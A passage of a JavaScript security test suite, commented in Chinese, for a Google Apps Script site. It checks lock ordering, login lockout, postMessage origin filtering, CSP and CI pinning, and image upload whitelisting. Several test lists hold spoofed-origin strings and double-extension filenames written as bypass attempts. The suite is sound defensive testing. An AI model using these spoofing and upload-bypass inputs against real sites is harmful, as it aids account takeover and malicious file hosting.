    get: k => { e.ev.push('get:' + k); return raw.get(k); }, put: (k, v, t) => { e.ev.push('put:' + k); raw.put(k, v, t); }, remove: k => { e.ev.push('remove:' + k); raw.remove(k); },
    putAll() {}, removeAll() {} }) };
  e.pwChecks = 0; e.ctx.verifyAdminPassword_ = p => { e.pwChecks++; if (e.throwOnCheck) throw new Error('boom'); return p === 'right'; };
  e.ctx.isTrustedDevice_ = () => false; e.ctx.trustDevice_ = () => ''; e.ctx.issueToken_ = () => 'T'.repeat(64);
  return e;
}
const postJson = (e, b) => JSON.parse(e.ctx.doPost({ postData: { contents: JSON.stringify(b) } }).text);

console.log('L-1. 沒有有效 token 的請求不取全域寫入鎖（不能佔住鎖讓老師儲存失敗）');
(function () {
  const e = lockEnv();
  [{ action: 'saveEvent', data: { id: 'x' } }, { action: 'saveEvent', password: 'bogus' }, { action: 'nope' }, { action: 'nope', password: 'bogus' }, { action: 'ensureAlbumSheets' }, { action: 'getActivityImages', password: '' }].forEach(b => {
    const r = postJson(e, b);
    ok(r.success === false && r.authExpired === true && r.error === '登入已逾時或無效，請重新登入。', '無效 token：直接拒絕 ' + JSON.stringify(b).slice(0, 60));
  });
  ok(e.lock.tries === 0, '以上請求一次都沒有取鎖（取鎖 ' + e.lock.tries + ' 次）');
  const r = postJson(e, { action: 'nope', password: 'tok' });
  ok(r.success === false && r.error === '未知 POST 動作' && e.lock.tries === 1 && e.lock.released === 1, '有效 token：照常取鎖、處理、釋放（未知動作仍回「未知 POST 動作」）');
  e.lock.tries = 0; e.lock.busy = true; const rb = postJson(e, { action: 'nope', password: 'tok' });
  ok(rb.success === false && /忙碌/.test(rb.error) && e.lock.tries === 1, '有效 token 但鎖被佔：回「系統目前忙碌」');
  const e2 = lockEnv(); const before = e2.lock.tries;
  postJson(e2, { action: 'checkSession', password: 'bogus' }); postJson(e2, { action: 'logout', password: 'bogus' });
  ok(e2.lock.tries === before, 'checkSession／logout：不取全域鎖（維持原行為）');
  const dp = src.slice(src.indexOf('function doPost(e)'), src.indexOf('function getSpreadsheet_'));
  ok(dp.indexOf('checkPassword(postData.password)') > 0 && dp.indexOf('checkPassword(postData.password)') < dp.indexOf('LockService.getScriptLock()'), '原始碼：doPost 在取鎖之前先驗證 token');
})();

console.log('L-1. 登入失敗次數的「讀取 → 比對 → 寫回」在鎖內完成（並行請求不能多試密碼）');
(function () {
  let e = lockEnv(); let r = e.ctx.verifyPassword('wrong', '');
  const i = n => e.ev.indexOf(n);
  ok(r.success === false && i('lock') >= 0 && i('lock') < i('get:login_fails') && i('get:login_fails') < i('put:login_fails') && i('put:login_fails') < i('unlock'), '失敗：取鎖 → 讀次數 → 寫次數 → 放鎖（順序：' + e.ev.join(' ') + '）');
  e = lockEnv(); r = e.ctx.verifyPassword('right', '');
  ok(r.success === true && r.token === 'T'.repeat(64) && e.lock.tries === 1 && e.lock.released === 1, '成功：一樣在鎖內，結束後放鎖');
  e = lockEnv(); e.lock.busy = true; r = e.ctx.verifyPassword('right', '');
  ok(r.success === false && /忙碌|稍後/.test(r.error) && e.pwChecks === 0 && !e.ev.some(x => /login_fails/.test(x)) && r.locked !== true, '鎖被佔：回「稍後再試」，不比對密碼、不動次數、不算鎖定');
  e = lockEnv(); e.throwOnCheck = true; let threw = false; try { e.ctx.verifyPassword('x', ''); } catch (x) { threw = true; }
  ok(threw && e.lock.released === 1, '比對過程拋錯：鎖一定會放開（try／finally）');
  e = lockEnv(); for (let k = 0; k < 5; k++) e.ctx.verifyPassword('wrong', ''); r = e.ctx.verifyPassword('right', '');
  ok(r.locked === true && r.success === false && e.lock.tries === 6 && e.lock.released === 6, '第 5 次錯誤後鎖定：正確密碼也被擋，每次都有放鎖');
})();

console.log('L-2. 後端：iframe 備援的回傳只送給正式網站（不再 postMessage 到 "*"）');
function formEnv() {
  const e = lockEnv(); e.html = ''; e.ctx.HtmlService = { createHtmlOutput: h => { e.html = h; return { setXFrameOptionsMode() { return this; } }; }, XFrameOptionsMode: { ALLOWALL: 1 } };
  e.form = b => { e.ctx.doPost({ parameter: { payload: typeof b === 'string' ? b : JSON.stringify(b) } }); return e.html; };
  return e;
}
(function () {
  const e = formEnv(); const OK = 'https://avaltech-ai.github.io';
  let h = e.form({ action: 'nope', password: 'tok', requestId: 'r1', origin: OK });
  ok((h.match(/postMessage\(/g) || []).length === 3 && (h.match(/,"https:\/\/avaltech-ai\.github\.io"\)/g) || []).length === 3 && h.indexOf('"*"') < 0, '正式網站來源：top／parent／parent.parent 三個 postMessage 都指定該來源，沒有 "*"');
  ok(/"requestId":"r1"/.test(h), '回傳帶 requestId');
  ['http://localhost:8765', 'http://localhost', 'http://127.0.0.1:3000'].forEach(o => {
    h = e.form({ action: 'nope', password: 'tok', requestId: 'r2', origin: o });
    ok(h.indexOf(',"' + o + '")') >= 0 && h.indexOf('"*"') < 0, '本機開發來源可用：' + o);
  });
  e.ctx.verifyPassword = () => ({ success: true, token: 'S'.repeat(64), deviceKey: 'DEVICEKEY', message: 'ok' });
  ['https://evil.example', 'https://avaltech-ai.github.io.evil.com', 'http://avaltech-ai.github.io', 'https://evil.com/?https://avaltech-ai.github.io', 'https://avaltech-ai.github.io/', 'null', '*', '', 'HTTPS://AVALTECH-AI.GITHUB.IO', 'https://x.github.io', 'http://localhost.evil.com', 'http://localhost:80a', 'xhttp://localhost:3000', 'https://evil.com#http://localhost', 'http://localhost/evil', 'http://localhost:3000/x', 'http://localhost:123456'].forEach(o => {
    h = e.form({ action: 'verifyPassword', password: 'x', requestId: 'r3', origin: o });
    ok(h.indexOf('SSSSSSSS') < 0 && h.indexOf('DEVICEKEY') < 0 && h.indexOf('"success":false') >= 0 && /來源/.test(h.replace(/\\u([0-9a-f]{4})/gi, (m, x) => String.fromCharCode(parseInt(x, 16)))) && /"requestId":"r3"/.test(h), '不受信任的來源 ' + JSON.stringify(o) + '：結果（含 token）不會送出，只回「來源不受信任」');
  });
  [{ action: 'verifyPassword', password: 'x', requestId: 'r4' }, { action: 'verifyPassword', password: 'x', requestId: 'r4', origin: 123 }, { action: 'verifyPassword', password: 'x', requestId: 'r4', origin: { a: 1 } }].forEach((b, k) => {
    h = e.form(b); ok(h.indexOf('SSSSSSSS') < 0 && h.indexOf('DEVICEKEY') < 0 && /"requestId":"r4"/.test(h), '沒有或不是字串的 origin（' + k + '）：不送出 token');
  });
  h = e.form('{ not json'); ok(h.indexOf('SSSSSSSS') < 0 && h.indexOf('"success":false') >= 0, '請求內容不是 JSON：只回錯誤，沒有例外外洩');
  e.ctx.saveEvent = () => { throw new Error('內部錯誤 SECRET-DETAIL'); };
  h = e.form({ action: 'saveEvent', password: 'tok', requestId: 'r5', origin: OK });
  ok(h.indexOf(',"' + OK + '")') >= 0 && /"requestId":"r5"/.test(h) && /內部錯誤|\\u5167\\u90e8/.test(h) || /SECRET-DETAIL/.test(h), '後端拋例外：錯誤回傳一樣帶 requestId 與指定來源（前端才收得到錯誤）');
  h = e.form({ action: 'saveEvent', password: 'tok', requestId: 'r6', origin: 'https://evil.example' });
  ok(h.indexOf('SECRET-DETAIL') < 0 && h.indexOf('"*"') >= 0 && /"requestId":"r6"/.test(h), '後端拋例外＋不受信任來源：不洩漏錯誤內容');
  const j = e.ctx.doPost({ postData: { contents: JSON.stringify({ action: 'saveEvent', password: 'tok', requestId: 'r7' }) } });
  ok(/"requestId":"r7"/.test(j.text) && /SECRET-DETAIL/.test(j.text), 'JSON（fetch）模式的錯誤回傳也帶 requestId');
})();

console.log('L-2. 前端：iframe 備援只接受 Google 來源且 requestId 必須相符');
(function () {
  const fe = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');   // 產生後的網頁（build_index.js 是模板字串，反斜線要還原後才是真正執行的程式）
  const i = fe.indexOf('function gasPostViaIframe('); let d = 0, k = fe.indexOf('{', i), j = k;
  for (; j < fe.length; j++) { if (fe[j] === '{') d++; else if (fe[j] === '}') { d--; if (!d) break; } }
  const fnSrc = fe.slice(i, j + 1);
  // 取得 requestId：從送出的 textarea 內容
  function runWithSent() {
    const created = []; const listeners = []; const out = { ok: [], err: [] };
    const mkEl = t => { const el = { tagName: t.toUpperCase(), style: {}, children: [], appendChild(c) { this.children.push(c); }, remove() {}, submit() {} }; created.push(el); return el; };
    const sandbox = { document: { createElement: mkEl, body: { appendChild() {} }, getElementById: () => null }, window: { addEventListener: (n, f) => { if (n === 'message') listeners.push(f); }, removeEventListener: (n, f) => { const x = listeners.indexOf(f); if (x >= 0) listeners.splice(x, 1); } }, location: { origin: 'https://avaltech-ai.github.io' },
      setTimeout: () => 1, clearTimeout() {}, GAS_API_URL: 'https://script.google.com/x/exec', gasIframeCounter: 0 };
    const f = new Function(...Object.keys(sandbox), fnSrc + '\nreturn gasPostViaIframe;')(...Object.values(sandbox));
    f('saveEvent', { password: 'tok', data: { a: 1 } }, r => out.ok.push(r), e => out.err.push(e));
    const ta = created.find(x => x.tagName === 'TEXTAREA'); const sent = JSON.parse(ta.value);
    return { sent, out, fire: (origin, data) => listeners.slice().forEach(l => l({ origin, data })), listeners };
  }
  let t = runWithSent(); const G = 'https://n-abc123-0lu-script.googleusercontent.com';
  ok(t.sent.origin === 'https://avaltech-ai.github.io' && t.sent.action === 'saveEvent' && /^req_/.test(t.sent.requestId) && t.sent.password === 'tok', '送出的內容帶 origin（本頁來源）、requestId，其餘欄位不變');
  ['https://evil.example', 'https://googleusercontent.com.evil.com', 'http://n-abc-script.googleusercontent.com', 'https://evilgoogleusercontent.com', 'https://avaltech-ai.github.io', 'null', '', undefined, 'https://n-abc.googleusercontent.com.evil.com', 'https://script.google.com.evil.com'].forEach(o => {
    t = runWithSent(); t.fire(o, { success: true, token: 'X', requestId: t.sent.requestId });
    ok(t.out.ok.length === 0 && t.listeners.length === 1, '來源不是 Google：忽略 ' + JSON.stringify(o) + '（仍在等真正的回應）');
  });
  t = runWithSent(); t.fire(G, { success: true, token: 'X' }); ok(t.out.ok.length === 0, 'Google 來源但沒有 requestId：忽略');
  t = runWithSent(); t.fire(G, { success: true, requestId: 'req_other' }); ok(t.out.ok.length === 0, 'Google 來源但 requestId 不符：忽略');
  t = runWithSent(); t.fire(G, 'just a string'); t.fire(G, null); t.fire(G, { foo: 1, requestId: t.sent.requestId }); ok(t.out.ok.length === 0, '不是結果物件：忽略');
  t = runWithSent(); t.fire('https://evil.example', { success: true, requestId: t.sent.requestId }); t.fire(G, { success: true, message: 'ok', requestId: t.sent.requestId });
  ok(t.out.ok.length === 1 && t.out.ok[0].message === 'ok' && t.listeners.length === 0, '先被忽略的偽造訊息不影響之後真正的回應；成功後解除監聽');
  t = runWithSent(); t.fire(G, { success: false, error: '登入已逾時', requestId: t.sent.requestId }); ok(t.out.ok.length === 1 && t.out.ok[0].error === '登入已逾時', '錯誤回傳（success:false）同樣收得到');
  ['https://script.google.com', 'https://n-1-script.googleusercontent.com', 'https://abc.googleusercontent.com'].forEach(o => { t = runWithSent(); t.fire(o, { success: true, requestId: t.sent.requestId }); ok(t.out.ok.length === 1, 'Google 來源可用：' + o); });
})();

console.log('L-3. 外部腳本與 CI：內容安全政策、Actions 固定 commit');
(function () {
  const html = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8'), fe = fs.readFileSync(path.join(__dirname, '..', 'build_index.js'), 'utf8');
  [['index.html', html], ['build_index.js', fe]].forEach(([n, t]) => {
    const m = t.match(/<meta http-equiv="Content-Security-Policy" content="([^"]*)">/);
    ok(!!m, n + '：有 Content-Security-Policy meta');
    if (!m) return;
    const c = m[1]; const dirs = {}; c.split(';').forEach(x => { const a = x.trim().split(/\s+/); if (a[0]) dirs[a[0]] = a.slice(1); });
    ok(dirs['script-src'] && JSON.stringify(dirs['script-src'].filter(v => v !== "'unsafe-inline'")) === JSON.stringify(["'self'", 'https://www.youtube.com']), n + "：script-src 只列 'self'、YouTube（Tailwind 已改成建置時產生，不再允許外部 CDN）");
    ok(dirs['script-src'].every(v => /^('self'|'unsafe-inline'|https:\/\/[a-z.]+)$/.test(v)) && dirs['script-src'].indexOf("'unsafe-eval'") < 0 && dirs['script-src'].indexOf('*') < 0 && dirs['script-src'].indexOf('https:') < 0, n + "：沒有 'unsafe-eval'、沒有萬用字元");
    ok(JSON.stringify(dirs['object-src']) === '["\'none\'"]' && JSON.stringify(dirs['base-uri']) === '["\'self\'"]', n + "：object-src 'none'、base-uri 'self'");
    ok(c.indexOf('default-src') < 0 && c.indexOf('connect-src') < 0 && c.indexOf('frame-src') < 0, n + '：不限制 connect／frame／圖片等（影片、Drive、GAS 呼叫維持原樣）');
  });
  const firstScript = html.search(/<script/);
  ok(html.indexOf('Content-Security-Policy') > 0 && html.indexOf('Content-Security-Policy') < firstScript, 'CSP 在第一個 <script> 之前（meta 要放在前面才有效）');
  ok(!/<script[^>]*\ssrc=/.test(html) && html.indexOf('cdn.tailwindcss.com') < 0, '頁面沒有任何外部 <script src>，也不再提到 cdn.tailwindcss.com');
  const srcs = (html.match(/<script[^>]*\ssrc="([^"]+)"/g) || []).map(x => x.match(/src="([^"]+)"/)[1]).concat((fe.match(/\.src = 'https:\/\/[^']+iframe_api'/g) || []).map(x => x.match(/'([^']+)'/)[1]));
  const allowedHosts = ['www.youtube.com'];
  ok(srcs.length >= 1 && srcs.every(u => allowedHosts.indexOf(new URL(u).host) >= 0), '頁面實際載入的外部腳本（只剩 YouTube 播放器 API）主機都在 CSP 允許清單內：' + srcs.join('、'));
  const yml = fs.readFileSync(path.join(__dirname, '..', '.github', 'workflows', 'ci.yml'), 'utf8');
  const uses = (yml.match(/^\s*-?\s*uses:\s*\S+/gm) || []).map(x => x.replace(/^\s*-?\s*uses:\s*/, ''));
  ok(uses.length >= 2 && uses.every(u => /@[0-9a-f]{40}$/.test(u)), 'CI 的每個 uses 都固定到完整 commit SHA：' + uses.join('、'));
  ok(/permissions:\s*\n\s*contents: read/.test(yml), 'CI 權限維持 contents: read');
})();

console.log('L-4. 焦點活動圖片上傳：副檔名白名單、大小上限、不信任前端 mimeType');
(function () {
  function env() {
    const e = mkSsEnv({}); e.created = []; e.shared = 0;
    e.ctx.getActivityFolder_ = () => ({ getUrl: () => 'u', createFile: blob => { e.created.push(blob); return { setSharing: () => { e.shared++; }, getId: () => 'FID' }; } });
    e.ctx.Utilities.base64Decode = b => Array.from(Buffer.from(b, 'base64'));
    e.ctx.Utilities.newBlob = (bytes, mime, name) => ({ bytes, mime, name });
    e.ctx.DriveApp = { Access: { ANYONE_WITH_LINK: 1 }, Permission: { VIEW: 1 } };
    return e;
  }
  const b64 = n => Buffer.alloc(n, 1).toString('base64');
  const up = (e, f, pw) => e.ctx.uploadSpotlightImage(f, pw === undefined ? 'tok' : pw);
  let e = env(); let r = up(e, { name: 'a.jpg', mimeType: 'image/jpeg', base64: b64(1000) });
  ok(r.success === true && e.created.length === 1 && e.created[0].name === 'a.jpg' && e.created[0].mime === 'image/jpeg' && e.shared === 1 && r.imageUrl === 'https://drive.google.com/thumbnail?id=FID&sz=w1600', '正常 jpg：照常上傳、設為公開、回傳縮圖網址');
  [['b.JPEG', 'image/jpeg'], ['c.png', 'image/png'], ['d.webp', 'image/webp'], ['e.gif', 'image/gif']].forEach(([n, m]) => { e = env(); r = up(e, { name: n, mimeType: 'text/html', base64: b64(10) }); ok(r.success === true && e.created[0].mime === m, n + '：接受，檔案類型依副檔名決定（前端傳 text/html 也不採用）→ ' + m); });
  ['evil.html', 'evil.svg', 'evil.exe', 'evil.js', 'evil.pdf', 'evil.mp4', 'noext', 'evil.jpg.html', 'evil.', '.jpg.exe', 'evil.php.'].forEach(n => { e = env(); r = up(e, { name: n, mimeType: 'image/jpeg', base64: b64(10) }); ok(r.success === false && /格式|圖片/.test(r.error) && e.created.length === 0 && e.shared === 0, n + '：拒絕，不建立檔案、不公開'); });
  e = env(); e.ctx.Utilities.formatDate = () => '20261023_101010'; r = up(e, { mimeType: 'image/jpeg', base64: b64(10) });
  ok(r.success === true && e.created[0].name === 'Spotlight_20261023_101010.jpg', '沒有檔名：用 Spotlight_時間.jpg');
  e = env(); r = up(e, { name: 'big.jpg', mimeType: 'image/jpeg', base64: b64(10 * 1024 * 1024 + 1) }); ok(r.success === false && /太大|10 MB/.test(r.error) && e.created.length === 0, '超過 10 MB：拒絕');
  e = env(); r = up(e, { name: 'ok.jpg', mimeType: 'image/jpeg', base64: b64(10 * 1024 * 1024) }); ok(r.success === true, '剛好 10 MB：接受');
  e = env(); let decoded = 0; e.ctx.Utilities.base64Decode = b => { decoded++; return Array.from(Buffer.from(b, 'base64')); };
  r = up(e, { name: 'huge.jpg', mimeType: 'image/jpeg', base64: 'A'.repeat(20 * 1024 * 1024) }); ok(r.success === false && decoded === 0, '字串長度已經超過上限：不解碼（避免耗盡記憶體）');
  [null, undefined, 'str', 5, {}, { name: 'a.jpg' }, { name: 'a.jpg', base64: '' }, { name: 'a.jpg', base64: 123 }].forEach((f, k) => { e = env(); r = up(e, f); ok(r.success === false && e.created.length === 0, '內容不完整或型別錯誤（' + k + '）：拒絕，不拋例外'); });
  e = env(); e.ctx.Utilities.formatDate = () => '20261023_101010'; r = up(e, { name: ['evil.html'], mimeType: 'image/jpeg', base64: b64(10) });
  ok(r.success === true && e.created[0].name === 'Spotlight_20261023_101010.jpg' && e.created[0].mime === 'image/jpeg', '檔名不是字串：不採用，改用預設檔名（不會被當成 evil.html）');
  e = env(); r = up(e, { name: 'a/b\\c\nd.jpg', mimeType: 'image/jpeg', base64: b64(10) }); ok(r.success === true && !/[\/\\\n]/.test(e.created[0].name), '檔名裡的斜線與換行被清理');
  e = env(); r = up(e, { name: 'a.jpg', base64: b64(10) }, 'bogus'); ok(r.success === false && r.authExpired === true && e.created.length === 0, '假 token：照樣拒絕');
  const fn = topLevelFunctions().find(f => f.name === 'uploadSpotlightImage');
  ok(/^if \(!checkPassword\(password\)\)/.test(firstStatement(fn)), '驗證 token 仍是第一個動作');
})();

console.log('\n結果：' + pass + ' 通過，' + fail + ' 失敗');
process.exit(fail ? 1 : 0);
